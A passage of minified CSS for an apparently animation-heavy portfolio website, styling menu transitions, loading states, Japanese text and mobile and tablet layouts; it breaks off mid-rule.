.title-a.flip-a .f .s,.is-not-touch.is-page-tr-start .site-nav-a .b .s,.is-not-touch.is-page-tr-start .site-nav-a .f .s{-webkit-transition:none;transition:none;-webkit-transform:rotate(0deg) translate(0);transform:rotate(0deg) translate(0)}html[lang=ja] .section-text .h1,html[lang=ja] .section-text .h2,html[lang=ja] .section-text .h3,html[lang=ja] .section-text .h4,html[lang=ja] .section-title{line-height:1.5}html[lang=ja] .editor *{line-height:1.8}html[lang=ja] .editor h2,html[lang=ja] .editor h2 *,html[lang=ja] .editor h3,html[lang=ja] .editor h3 *,html[lang=ja] .editor h4,html[lang=ja] .editor h4 *{line-height:1.4}html[lang=ja] .caption *{line-height:1.8}html[lang=ja] .caption h2,html[lang=ja] .caption h2 *,html[lang=ja] .caption h3,html[lang=ja] .caption h3 *,html[lang=ja] .caption h4,html[lang=ja] .caption h4 *{line-height:1.4}html[lang=ja] .editor h2,html[lang=ja] .section-text .h1{font-size:1.88503vw;line-height:1.6;font-weight:500}.site-mask{pointer-events:none;width:200%;height:100%;position:fixed;top:0;left:-50%;z-index:1;opacity:0;-webkit-transition:opacity .8s cubic-bezier(.44,.15,.2,1);transition:opacity .8s cubic-bezier(.44,.15,.2,1)}.is-page-in-home .site-mask,.site-mask{-webkit-box-shadow:inset 0 0 12.5vh 12.5vh #060606;box-shadow:inset 0 0 12.5vh 12.5vh #060606}.is-loading-complete .site-mask{opacity:.85}.clip-t{-webkit-transform:translateX(120%);transform:translateX(120%)}.gl,.site-body{-webkit-transform:translate(0);transform:translate(0)}.clip-w{overflow:hidden;position:relative}.site-nav{-webkit-transition:z-index 0s .8s;transition:z-index 0s .8s;z-index:-999}.ui-toggle-a{height:1em;position:absolute;line-height:1;left:0;top:50%;overflow:hidden;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.ui-toggle-a .b{display:block;-webkit-transform:translate(100%);transform:translate(100%)}.js--menu-open-enter{overflow:hidden!important}.js--menu-open-enter .site-nav{-webkit-transition:z-index 0s;transition:z-index 0s;z-index:9}.js--menu-open-enter .clip-t,.js--menu-open-enter .gl,.js--menu-open-enter .page-content,.js--menu-open-enter .page-header,.js--menu-open-enter .site-body,.js--menu-open-enter .ui-fade-out,.js--menu-open-enter .ui-splash-in,.js--menu-open-enter .ui-toggle .t{-webkit-transition:all .82s cubic-bezier(.44,.15,.2,1)!important;transition:all .82s cubic-bezier(.44,.15,.2,1)!important}.js--menu-open-enter .page-content,.js--menu-open-enter .site-body,.js--menu-open-enter .ui-fade-out{opacity:0!important}.js--menu-open-enter .clip-t{-webkit-transform:translateX(0);transform:translateX(0)}.js--menu-open-enter .page-header{opacity:0!important}.js--menu-open-enter .ui-toggle .t1{-webkit-transform:translate(0) rotate(-45deg);transform:translate(0) rotate(-45deg)}.js--menu-open-enter .ui-toggle .t2{-webkit-transform:translate(0) rotate(45deg);transform:translate(0) rotate(45deg)}.js--menu-open-enter .ui-toggle-a .b{-webkit-transition:all .82s cubic-bezier(.44,.15,.2,1);transition:all .82s cubic-bezier(.44,.15,.2,1);-webkit-transform:translate(0);transform:translate(0)}.js--menu-open-enter.js--state-bg-white .site-header a{color:#fafafa}.js--menu-open-enter.js--state-bg-white .ui-toggle .t div{background:#fafafa}.js--menu-open-leave{overflow:hidden!important}.js--menu-open-leave .clip-t,.js--menu-open-leave .page-content,.js--menu-open-leave .page-header,.js--menu-open-leave .ui-fade-out,.js--menu-open-leave .ui-toggle .t{-webkit-transition:all .72s cubic-bezier(.55,.23,.18,1.01);transition:all .72s cubic-bezier(.55,.23,.18,1.01)}.js--menu-open-leave .gl,.js--menu-open-leave .site-body{-webkit-transition:all .82s cubic-bezier(.55,.23,.18,1.01);transition:all .82s cubic-bezier(.55,.23,.18,1.01)}.js--menu-open-leave .clip-t,.js--menu-open-leave .ui-toggle-a .b{-webkit-transform:translateY(-100%);transform:translateY(-100%)}.js--menu-open-leave .ui-toggle-a .b{-webkit-transition:all .82s cubic-bezier(.55,.23,.18,1.01);transition:all .82s cubic-bezier(.55,.23,.18,1.01)}.progress-f{stroke-dashoffset:503.725px;stroke-dasharray:503.725px,513.725px}.gl{pointer-events:none}html{overflow:hidden;background:#030303}body{background:transparent}.progress-b{opacity:.15}.page-body,.ui-splash-in{opacity:0}#js--gl-back{z-index:2}#js--gl-front{z-index:3}.is-loading-before .logo-icon{cursor:default;pointer-events:none}.is-loading-after,.is-loading-after *,.is-loading-before,.is-loading-before *,.is-page-in-404 .logo-icon,.is-page-in-about .logo-icon,.is-page-in-contact .logo-icon{cursor:progress!important}.is-loading-after .gl{pointer-events:auto}.is-loading-after .logo-icon{cursor:pointer;pointer-events:all;-webkit-transform:translate(0);transform:translate(0);opacity:0;-webkit-transition:none;transition:none}.page-title-wrap{opacity:0}.is-loading-complete{cursor:auto;overflow:visible;background:#060606}.is-loading-complete .logo-icon{cursor:pointer;pointer-events:all;-webkit-transform:translate(0);transform:translate(0);opacity:0}.is-loading-complete .gl{pointer-events:none}.is-loading-complete .page-body,.is-loading-complete .progress-f,.is-loading-complete .ui-splash-in{-webkit-transition:opacity .82s cubic-bezier(.4,.22,.21,1.04);transition:opacity .82s cubic-bezier(.4,.22,.21,1.04);opacity:1}.is-loading-complete .progress-b{opacity:.15}.is-loading-complete .page-title-wrap{opacity:1}.is-loading-complete #js--gl-back{z-index:1}.is-loading-complete #js--gl-front{z-index:4}.is-loading-complete body{background:transparent}.is-loading-complete .is-page-in-single #js--gl-front{z-index:2}.is-mobile.is-loading-complete #js--gl-front,.is-page-tr-start.is-loading-complete .is-page-in-single #js--gl-front,.is-tablet.is-loading-complete #js--gl-front{z-index:4}.is-page-tr-start .ui-category,.is-page-tr-start .ui-num{opacity:0}.is-page-tr-start .is-page-in-single #js--gl-front{z-index:4}.is-loading-complete.js--menu-open-enter .logo-icon{pointer-events:none}.is-desktop.is-loading-complete .page-header .page-title-wrap{opacity:0}.is-legacy .site-control-body[data-type=text].flip-vr{display:none!important}.is-legacy .page-header{opacity:1}.is-legacy .page-header .page-title-in,.is-legacy .page-title-move .page-title-in{line-height:1;padding-left:15vw;padding-right:15vw;text-align:right;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-transform:uppercase}.is-legacy .works-header .page-title-in{text-align:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.is-legacy .page-title-move .page-title{opacity:0}.is-legacy .page-title-move .page-title._active{opacity:1;-webkit-transition:opacity .6s cubic-bezier(.4,.22,.21,1.04);transition:opacity .6s cubic-bezier(.4,.22,.21,1.04)}.is-legacy .page-title-move .page-title-in .title-wrap{text-align:right;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.is-legacy .page-title-in .title-wrap{word-break:keep-all}.is-legacy .plane[data-layout=cols],.is-legacy .plane[data-layout=fullscreen],.is-legacy .plane[data-layout=normal],.is-legacy .plane[data-layout=slide]{background:hsla(0,0%,100%,0)}.is-legacy.is-desktop.is-loading-complete .page-header .page-title-wrap,.is-low.is-desktop.is-loading-complete .page-header .page-title-wrap{opacity:1}.is-low.is-mobile .single-header .page-title-in,.is-low.is-tablet .single-header .page-title-in{text-align:center}.is-low .a-more{display:none!important}.is-low .page-header .subpage-title-wrap{opacity:0!important}.is-low .logo-svg{width:120px;height:120px}.is-low .page-title-in{position:relative;z-index:2}.is-low .page-title-bg{opacity:.5;width:100%;height:100%;position:absolute;top:0;left:0}.is-low .site-control{display:none!important}.is-low .page-header .subpage-title-wrap{display:-webkit-box;display:-ms-flexbox;display:flex}.is-low .page-header .subpage-title-wrap,.is-low .page-header .subpage-title-wrap .page-title-in{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.is-low .page-header .subpage-title-wrap .page-title-in{height:auto;text-align:center}.is-low .page-title-move .page-title-in .title-wrap{text-align:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.is-low .page-title-move-wrap{height:100vh!important;overflow:auto!important;overflow-x:hidden!important;position:relative;top:auto;-webkit-transform:translateY(0);transform:translateY(0)}.is-low .page-title-move{height:auto;padding:20vh 0}.is-low .page-title-move .page-title{height:auto}@media screen and (max-width:1500px){body{font-size:1.3rem}.ja{font-size:1.56rem}.ja2,.page-content{font-size:1.365rem}.editor h2,.section-text .h1{font-size:3.71293rem}.caption h2,.caption h3,.caption h4,.editor h3,.flip-btn,.section-text .h2{font-size:2.8561rem}.flip-btn .ja{font-size:2.28488rem}.editor h4,.section-text .h3{font-size:2.197rem}.support{font-size:1.365rem}.logo-a,.logo-h1,.site-nav-sns ul,.works-header .h2{font-size:1.69rem}.logo-a .ja{font-size:1.352rem}.page-title-in,.section-title{font-size:6vw}.page-title-in .ja{font-size:5.1vw}.page-title-l{font-size:6.8vw}.page-title-l .ja{font-size:6.12vw}.site-nav-a{font-size:6.8vw}html[lang=ja] .editor h2,html[lang=ja] .section-text .h1{font-size:2.97034rem}}.site-body .js--scroll-height{display:none}.is-page-tr-start.is-mobile .site-content>.side.ui-select,.is-page-tr-start.is-tablet .site-content>.side.ui-select{z-index:5;opacity:0!important}.is-mobile,.is-tablet{overflow:hidden}.is-mobile .ui-select-label,.is-tablet .ui-select-label{position:absolute;left:-9999px}.is-mobile *,.is-tablet *{-webkit-tap-highlight-color:rgba(0,0,0,0)}.is-mobile .logo-a .ja,.is-tablet .logo-a .ja{display:none}.is-mobile .is-page-in-home .site-body,.is-tablet .is-page-in-home .site-body{width:110%}.is-mobile .plane[data-layout=cols],.is-mobile .plane[data-layout=fullscreen],.is-mobile .plane[data-layout=looper],.is-mobile .plane[data-layout=normal],.is-mobile .plane[data-layout=slide],.is-tablet .plane[data-layout=cols],.is-tablet .plane[data-layout=fullscreen],.is-tablet .plane[data-layout=looper],.is-tablet .plane[data-layout=normal],.is-tablet .plane[data-layout=slide]{background-color:hsla(0,0%,100%,.05)}.is-mobile #js--gl-back,.is-mobile .site-body,.is-tablet #js--gl-back,.is-tablet .site-body{opacity:0}.is-mobile .site-content,.is-tablet .site-content{height:100%;width:100%;display:block}.is-mobile body,.is-tablet body{overflow:hidden}.is-mobile .site-body,.is-tablet .site-body{overflow:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overflow-scrolling:touch;-ms-scroll-chaining:none;overscroll-behavior:none}.is-mobile .no-touch,.is-mobile .no-touch *,.is-tablet .no-touch,.is-tablet .no-touch *{pointer-events:none}.is-mobile .page-scroll,.is-tablet .page-scroll{position:absolute;width:100%;height:100%}.is-mobile .page-title-move .page-title,.is-tablet .page-title-move .page-title{opacity:1;position:relative}.is-mobile .page-header .page-title-in,.is-mobile .page-title-in,.is-tablet .page-header .page-title-in,.is-tablet .page-title-in{padding:0 1em}.is-mobile .page-title-move-wrap,.is-tablet .page-title-move-wrap{overflow:hidden}.is-mobile .page-title-move-wrap.page-title-move-wrap-ghost,.is-tablet .page-title-move-wrap.page-title-move-wrap-ghost{overflow:visible!important;-webkit-text-stroke-width:.5px;-webkit-text-stroke-color:hsla(0,0%,100%,.3);color:transparent}.is-mobile .page-title-move-wrap,.is-mobile .page-title-move-wrap *,.is-tablet .page-title-move-wrap,.is-tablet .page-title-move-wrap *{pointer-events:none!important}.is-mobile .is-page-in-home .site-body .js--scroll-height,.is-tablet .is-page-in-home .site-body .js--scroll-height{z-index:3}.is-mobile .page-title-in .title-wrap,.is-tablet .page-title-in .title-wrap{position:relative}.is-mobile .js--words .w,.is-tablet .js--words .w{padding:0 .125em;display:inline-block}.is-mobile .js--words .w.ja,.is-tablet .js--words .w.ja{-webkit-transform:translateY(-4%) scaleY(.9);transform:translateY(-4%) scaleY(.9)}.is-mobile .page-title-in,.is-tablet .page-title-in{display:block;text-align:center;word-break:keep-all;line-height:1}.is-mobile .page-title-in,.is-mobile .page-title-move-wrap,.is-mobile .page-title-wrap,.is-tablet .page-title-in,.is-tablet .page-title-move-wrap,.is-tablet .page-title-wrap{height:38.44vw}.is-mobile .is-page-in-home .site-footer .js--scroll-height,.is-tablet .is-page-in-home .site-footer .js--scroll-height{display:none!important}.is-mobile .is-page-in-home .site-body .js--scroll-height,.is-tablet .is-page-in-home .site-body .js--scroll-height{display:block}.is-mobile .is-page-in-home .site-footer .js--scroll-height,.is-tablet .is-page-in-home .site-footer .js--scroll-height{display:none}.is-mobile .is-page-in-home .page-title-front,.is-tablet .is-page-in-home .page-title-front{-webkit-clip-path:none;clip-path:none}.is-mobile .is-page-in-home .page-title-mobile,.is-tablet .is-page-in-home .page-title-mobile{z-index:4}.is-mobile .is-page-in-home .page-content,.is-tablet .is-page-in-home .page-content{height:100%;width:100%;position:fixed;top:0;left:0}.is-mobile .plane video.source,.is-tablet .plane video.source{display:block;width:100%;height:auto;opacity:0;-webkit-transition:all 1s cubic-bezier(.4,.22,.21,1.04);transition:all 1s cubic-bezier(.4,.22,.21,1.04)}.is-mobile .video-played.plane video.source,.is-tablet .video-played.plane video.source{opacity:1}.is-mobile .reel-body .plane video.source,.is-tablet .reel-body .plane video.source{opacity:1!important}.is-mobile .page-body .section-bg-video.wh,.is-tablet .page-body .section-bg-video.wh{height:auto!important;overflow:hidden}.is-mobile .single-header .page-title-in,.is-tablet .single-header .page-title-in{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.is-mobile .page-header,.is-tablet .page-header{opacity:1}.is-mobile .img-stack-ul,.is-tablet .img-stack-ul{-webkit-perspective:100vh;perspective:100vh;-webkit-transform-style:preserve-3d;transform-style:preserve-3d}.is-mobile .img-stack-li,.is-tablet .img-stack-li{opacity:0;-webkit-transition:all .6s cubic-bezier(.4,.22,.21,1.04);transition:all .6s cubic-bezier(.4,.22,.21,1.04)}.is-mobile .img-stack-li.active,.is-tablet .img-stack-li.active{opacity:1}.is-mobile .caption.left,.is-mobile .caption.right,.is-tablet .caption.left,.is-tablet .caption.right{width:100%;padding:0}.is-mobile .logo-sub.logo-svg,.is-tablet .logo-sub.logo-svg{width:80vw;height:80vw;max-height:50vh;-webkit-transform:translate(-50%,-60%) scale(1.4);transform:translate(-50%,-60%) scale(1.4)}.is-mobile .img-mobile-li .plane[data-type=video],.is-tablet .img-mobile-li .plane[data-type=video]{height:auto!important}.is-mobile .img-mobile-ul .img-stack-body,.is-tablet .img-mobile-ul .img-stack-body{position:relative}.is-mobile .img-mobile-li .r,.is-tablet .img-mobile-li .r{position:absolute;z-index:4;width:20px;height:20px}.is-mobile .img-mobile-li .r path,.is-tablet .img-mobile-li .r path{fill:#060606}.is-mobile .img-mobile-li .r2,.is-tablet .img-mobile-li .r2{right:0;top:0;-webkit-transform:rotate(90deg);transform:rotate(90deg)}.is-mobile .img-mobile-li .r3,.is-tablet .img-mobile-li .r3{left:0;bottom:0;-webkit-transform:rotate(-90deg);transform:rotate(-90deg)}.is-mobile .img-mobile-li .r4,.is-tablet .img-mobile-li .r4{right:0;bottom:0;-webkit-transform:rotate(-180deg);transform:rotate(-180deg)}.is-mobile .is-page-in-404 .section-fullscreen,.is-tablet .is-page-in-404 .section-fullscreen{position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.is-mobile .works-a .img,.is-tablet .works-a .img{text-indent:-9999px}.is-mobile .flip-vr .flex .b,.is-mobile .flip-vr .flex .f,.is-tablet .flip-vr .flex .b,.is-tablet .flip-vr .flex .f{line-height:1;width:1em;padding:0}.is-mobile .img-slide-body,.is-mobile .img-slide-ul,.is-mobile .section-layout[data-layout=slide],.is-tablet .img-slide-body,.is-tablet .img-slide-ul,.is-tablet .section-layout[data-layout=slide]{height:60vh}.is-mobile .section-layout[data-layout=slide],.is-tablet .section-layout[data-layout=slide]{overflow:hidden}.is-mobile .img-slide-scroll-wrap,.is-tablet .img-slide-scroll-wrap{padding:0 0 30px;overflow-x:scroll;-webkit-overflow-scrolling:touch;overflow-scrolling:touch}.is-mobile .img-slide-wrap,.is-tablet .img-slide-wrap{padding:0!important;margin:10vh 0}.is-mobile .img-slide-scroll-wrap::-webkit-scrollbar,.is-tablet .img-slide-scroll-wrap::-webkit-scrollbar{width:0}.is-mobile .img-slide-scroll-wrap::-webkit-scrollbar-track,.is-tablet .img-slide-scroll-wrap::-webkit-scrollbar-track{position:fixed}.is-mobile .img-slide-scroll-wrap::-webkit-scrollbar-thumb,.is-tablet .img-slide-scroll-wrap::-webkit-scrollbar-thumb{position:fixed;background:transparent}.is-mobile .img-slide-scroll-wrap .flex-body.f-2,.is-tablet .img-slide-scroll-wrap .flex-body.f-2{margin-top:0}.is-mobile .img-slide-ul,.is-tablet .img-slide-ul{width:auto;display:-webkit-box;display:-ms-flexbox;display:flex}.is-mobile .reel-inner,.is-tablet .reel-inner{position:relative}.is-mobile .reel-body .plane video,.is-tablet .reel-body .plane video{position:absolute;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.is-mobile .site-header,.is-tablet .site-header{position:fixed;z-index:10;top:0}.is-mobile .site-content,.is-tablet .site-content{position:relative;overflow:hidden;height:calc(var(--vh)*100)!important}.is-mobile .page-title-move-wrap-ghost *,.is-tablet .page-title-move-wrap-ghost *{pointer-events:none}.is-mobile .reel-inner,.is-mobile .section-reel,.is-mobile .site-body,.is-mobile .site-nav,.is-mobile .wh,.is-tablet .reel-inner,.is-tablet .section-reel,.is-tablet .site-body,.is-tablet .site-nav,.is-tablet .wh{height:calc(var(--vh)*100)!important}.single-header .single-header-img{width:100%;height:100%;position:absolute;top:0;left:0}.single-header-img .js--inview{-webkit-transition:all 1s cubic-bezier(.4,.22,.21,1.04);transition:all 1s cubic-bezier(.4,.22,.21,1.04);opacity:0;width:100%;height:100%}.single-header-img video{position:absolute;top:50%;left:50%;height:100%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.is-loading-complete .single-header-img .js--inview[data-visible="1"]{opacity:.5}.mb-show,.tb-show{display:none}.logo-sub,.logo-svg-mobile{opacity:0}.is-mobile.is-loading-complete #js--gl-back,.is-mobile.is-loading-complete #js--gl-front,.is-mobile.is-loading-complete .logo-sub,.is-mobile.is-loading-complete .logo-svg-mobile,.is-mobile.is-loading-complete .page-title-move-wrap,.is-mobile.is-loading-complete .site-body,.is-tablet.is-loading-complete #js--gl-back,.is-tablet.is-loading-complete #js--gl-front,.is-tablet.is-loading-complete .logo-sub,.is-tablet.is-loading-complete .logo-svg-mobile,.is-tablet.is-loading-complete .page-title-move-wrap,.is-tablet.is-loading-complete .site-body{-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04);opacity:1}.is-mobile.is-loading-complete .logo-icon,.is-tablet.is-loading-complete .logo-icon{opacity:1}.is-mobile.is-loading-complete .is-page-in-about .logo-svg-mobile,.is-mobile.is-loading-complete .is-page-in-contact .logo-svg-mobile,.is-tablet.is-loading-complete .is-page-in-about .logo-svg-mobile,.is-tablet.is-loading-complete .is-page-in-contact .logo-svg-mobile{opacity:0}.is-mobile.is-page-tr-start #js--gl-back,.is-mobile.is-page-tr-start #js--gl-front,.is-mobile.is-page-tr-start .page-title-move-wrap,.is-mobile.is-page-tr-start .site-body,.is-mobile.is-tr-type-footer #js--gl-back,.is-mobile.is-tr-type-footer #js--gl-front,.is-mobile.is-tr-type-footer .page-title-move-wrap,.is-mobile.is-tr-type-footer .site-body,.is-mobile.js--menu-open-enter #js--gl-back,.is-mobile.js--menu-open-enter #js--gl-front,.is-mobile.js--menu-open-enter .page-title-move-wrap,.is-mobile.js--menu-open-enter .site-body,.is-tablet.is-page-tr-start #js--gl-back,.is-tablet.is-page-tr-start #js--gl-front,.is-tablet.is-page-tr-start .page-title-move-wrap,.is-tablet.is-page-tr-start .site-body,.is-tablet.is-tr-type-footer #js--gl-back,.is-tablet.is-tr-type-footer #js--gl-front,.is-tablet.is-tr-type-footer .page-title-move-wrap,.is-tablet.is-tr-type-footer .site-body,.is-tablet.js--menu-open-enter #js--gl-back,.is-tablet.js--menu-open-enter #js--gl-front,.is-tablet.js--menu-open-enter .page-title-move-wrap,.is-tablet.js--menu-open-enter .site-body{-webkit-transition:all .5s cubic-bezier(.4,.22,.21,1.04);transition:all .5s cubic-bezier(.4,.22,.21,1.04);opacity:0!important}.is-tr-to-subpages .logo-icon{-webkit-transition:all 0s cubic-bezier(.4,.22,.21,1.04);transition:all 0s cubic-bezier(.4,.22,.21,1.04);opacity:0!important}@media screen and (min-width:1024px){.is-tablet .single-body .section-information{padding-top:10vh}}@media screen and (max-width:1024px){.tb-hide{display:none!important}.tb-show{display:block!important}.site-control-counter-move span{font-size:1.2rem}.ja,.page-content,.site-copy,body,small{font-size:1.4rem}.editor h2,.section-text .h1{font-size:3.99854rem}.caption h2,.caption h3,.caption h4,.editor h3,.flip-btn,.section-text .h2{font-size:3.0758rem}.editor h4,.section-text .h3{font-size:2.366rem}.support{font-size:1.4rem}.site-nav-sns ul,.works-header .h2{font-size:1.82rem}.logo-h1{font-size:1.96rem}.page-title-in,.section-title{font-size:8vw}.page-title-in .ja{font-size:6.8vw}.page-title-l,.site-nav-a{font-size:10vw}.page-title-l .ja{font-size:8vw}.ui-toggle{right:0;top:0}.a-blank{bottom:0;left:39px}.a-reel{bottom:0;left:100px}.address,.ui-ar,.ui-category{bottom:200px;right:39px}.a-more{bottom:39px;right:39px}.ui-audio{bottom:0;right:0}.ui-scroll{bottom:50%;left:0}.ui-video-progress{left:0;bottom:0}.ui-num{bottom:0;right:39px}.logo-wrap{top:0;left:39px}.site-nav-sns{bottom:39px;left:39px}.site-copy{bottom:39px;right:39px}.site-control{left:39px;bottom:39px}.a-to-next,.ui-select{bottom:39px}.a-to-next{right:39px}.spr-0{min-height:0;height:300px}.spr-1{min-height:0;height:200px}.spr-2,.spr-3{min-height:0;height:100px}.spr-4,.spr-5{min-height:0;height:50px}.logo-wrap,.section-layout[data-layout=mobile][data-next=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-before,.section-layout[data-layout=mobile][data-prev=fullscreen] .spr-before{height:100px}.body,.body.thin{width:calc(100vw - 78px);margin:0 auto}.logo-a,.logo-icon{width:100px}.logo-icon{height:100px;margin-left:-50px}.logo-icon .logo-svg{width:100%;height:100%;-webkit-transform:translate(-50%,-50%) scale(1);transform:translate(-50%,-50%) scale(1)}.ui-audio,.ui-toggle{width:100px;height:100px}.ui-toggle{padding-left:0}.ui-audio-body,.ui-toggle-body{width:22px}.a-all,.a-blank,.a-pivot,.a-scroll{width:100px;height:100px}.a-more{width:auto;height:auto}.a-pagging{top:100%;-webkit-transform:translateY(calc(-100% - 39px));transform:translateY(calc(-100% - 39px));position:absolute;height:3em}.a-all,.a-scroll{top:100%;-webkit-transform:translate(-50%,-100%);transform:translate(-50%,-100%);position:absolute}.a-all span{text-transform:lowercase}.a-wrap,.ui-scroll{height:100px}.ui-scroll{padding:0 50px}.btn-circle{width:80px;height:80px}.section-cult .btn-wrap{right:39px;bottom:39px}.btn{width:200px;height:80px}.btn-body{padding:0 26.66667px}.ui-num{height:100px}.ui-num .bd{width:22px}.site-control{position:fixed;width:80px;height:80px}.site-control-back,.site-control-front{position:absolute;top:-10px;left:-10px;width:100px;height:100px}.site-control-body[data-type=progress]{margin-top:-50px}.ui-select-wrap{background:#fafafa;height:80px;width:200px;border-radius:80px}.ui-select select{padding:0 26.66667px}.ui-select .ui-select-arrow{width:80px;height:80px}.address{height:100px}.flip-btn-wrap{margin-top:50px}.page-body .flip-o{overflow:visible}.page-body .flip-c{opacity:1;-webkit-transform:translate(0);transform:translate(0)}.page-footer-body.wh{height:100vw!important}.site-nav-li{padding:.25em 0}.page-header{opacity:1}.subpage-title-wrap{height:auto}.subpage-title-wrap .page-title-in{padding:0 39px;height:auto}.page-body .wh{max-height:66.66667vw!important}.img-1col-li{padding:100px 0 0}.img-1col-li:first-child{padding-top:100px}.img-1col-li:last-child{padding-bottom:100px}.caption.right{padding-left:25px}.caption.left,.img-2col-li:nth-child(2n-1){padding-right:25px}.img-2col-li:nth-child(2n){padding-left:25px}.img-stack-li{width:50%}.img-slide-wrap{padding:0;margin:100px 0}.img-slide-li{padding-right:39px}.img-slide-li:last-child{padding-right:0}.img-mobile-ul{margin:-25px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.img-mobile-li{padding:0 25px;width:33.3333%}.a-pagging-body{padding:0}.single-body .section-information{padding-top:100px}.img-tablet-body{padding:20px;border-radius:30px;background-color:#141414;-webkit-box-shadow:0 0 0 1px #3e3e3e;box-shadow:0 0 0 1px #3e3e3e}.img-tablet-body .bg-img{border-radius:15px;overflow:hidden}.body.thin .img-mobile-ul{margin:0}.img-mobile-li{padding:0;position:relative}.img-mobile-ul .img-stack-body{padding-bottom:0}.section-layout[data-layout=mobile][data-prev=mobile] .spr-before{height:39px}.page-header .section-information{height:200px}.section-lead-text{padding-bottom:100px}.section.works-wrap{width:calc(100vw - 78px);margin:-50px auto 0}.works-header{height:66.66667vw}.works-header .page-header-body{height:100%}.works-header .page-title-in{-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.grid,.works-header .page-title-in{display:-webkit-box;display:-ms-flexbox;display:flex}.grid{-ms-flex-wrap:wrap;flex-wrap:wrap}.works-li{padding:0 19.5px 19.5px 0}.works-li,.works-li:nth-child(2n){width:calc((100vw - 78px)/2);height:calc((100vw - 78px)/4);margin-bottom:19.5px}.works-li:nth-child(2n){padding:0 0 19.5px 19.5px}.img-cult-ul{width:270vw}.img-cult-li{margin-right:5vw;width:40vw}.img-cult-wrap{width:540vw;-webkit-animation:loop 120s linear infinite forwards;animation:loop 120s linear infinite forwards}.img-cult-li:first-child{margin-top:0}.img-cult-li:nth-child(2){margin-top:20vw}.img-cult-li:nth-child(3){margin-top:2.5vw}.img-cult-li:nth-child(4){margin-top:12.5vw}.img-cult-li:nth-child(5){margin-top:0}.img-cult-li:nth-child(6){margin-top:20vw}@-webkit-keyframes loop{0%{-webkit-transform:translate(0);transform:translate(0)}to{-webkit-transform:translate(-270vw);transform:translate(-270vw)}}@keyframes loop{0%{-webkit-transform:translate(0);transform:translate(0)}to{-webkit-transform:translate(-270vw);transform:translate(-270vw)}}.section .cult-link-wrap{left:100px}.section .cult-link{-webkit-transform:translateY(-16vw);transform:translateY(-16vw)}.ui-audio-status{margin:-40px 0 0 -40px}.reel-body{padding:0;height:100%}.ui-video-progress{height:40px;position:absolute}.is-page-in-404 .section-fullscreen{opacity:.5;height:100%}.is-page-in-404 .section-bg-video .img-fullscreen-body{height:100%!important}.is-page-in-404 .section-bg-video .img-fullscreen-body video{position:absolute;height:100vh!important;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);width:177.77778vh}html[lang=ja] .editor h2,html[lang=ja] .section-text .h1{font-size:3.19883rem}}@media (orientation:landscape) and (max-width:900px),screen and (max-width:640px){.flip-btn-wrap{width:8em}.caption p:first-child{margin-top:2em}.mb-hide{display:none!important}.mb-show{display:block!important}.site-copy{display:none}.site-control-counter-move span{font-size:1.1rem}.ja,.page-content,body,small{font-size:1.4rem}.section-text .h1{font-size:2.016rem}.flip-btn{font-size:1.4rem}.caption h2,.caption h3,.caption h4,.editor h2,.editor h3,.editor h4,.section-text .h2,.section-text .h3{font-size:2.016rem}.site-nav-sns ul,.support{font-size:1.4rem}.works-header .h2{font-size:1.68rem}.logo-h1{font-size:1.568rem}.page-title-in,.section-title{font-size:8.5vw}.page-title-in .ja{font-size:7.225vw}.page-title-l,.site-nav-a{font-size:9vw}.page-title-l .ja{font-size:7.2vw}.ui-toggle{right:0;top:0}.a-blank{bottom:0;left:30px}.a-reel{left:80px}.a-all,.a-reel,.a-scroll,.address{bottom:0}.ui-ar,.ui-category{bottom:160px;right:30px}.a-more{bottom:30px;right:30px}.ui-audio{bottom:0;right:0}.ui-scroll{bottom:0;left:0}.ui-num{bottom:0;right:30px}.logo-wrap{top:0;left:30px}.site-nav-sns{top:auto;bottom:0}.site-control{left:30px;bottom:30px}.ui-select{bottom:0;left:0;-webkit-transform:translate(0);transform:translate(0)}.a-to-next{right:30px;bottom:30px}.site-nav .ui-lang{bottom:0;right:0;z-index:12}.a-pagging{top:100%;-webkit-transform:translateY(calc(-100% - 30px));transform:translateY(calc(-100% - 30px));position:absolute;height:3em}.spr-0,.spr-1,.spr-2,.spr-3,.spr-4{min-height:0;height:60px}.spr-5{min-height:0;height:30px}.section-layout[data-layout=mobile][data-next=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-after,.section-layout[data-layout=mobile][data-next=fullscreen][data-prev=fullscreen] .spr-before,.section-layout[data-layout=mobile][data-prev=fullscreen] .spr-before{height:60px}.logo-wrap{height:80px}.body,.body.thin{width:calc(100vw - 60px);margin:0 auto}.logo-a{width:80px}.logo-icon{width:80px;height:80px;margin-left:-40px}.logo-icon svg{width:50px}.ui-audio,.ui-toggle{width:80px;height:80px}.ui-audio-body,.ui-toggle-body{width:20px}.a-all,.a-blank,.a-pivot,.a-scroll{width:80px;height:80px}.a-wrap,.ui-scroll{height:80px}.ui-scroll{padding:0 40px}.ui-toggle .t1{-webkit-transform:translateY(-3px);transform:translateY(-3px)}.ui-toggle .t2{-webkit-transform:translateY(3px);transform:translateY(3px)}.btn-circle{width:50px;height:50px}.btn-circle-body .txt{font-size:1.3rem;-webkit-transform:translateY(-10%);transform:translateY(-10%)}.section-cult 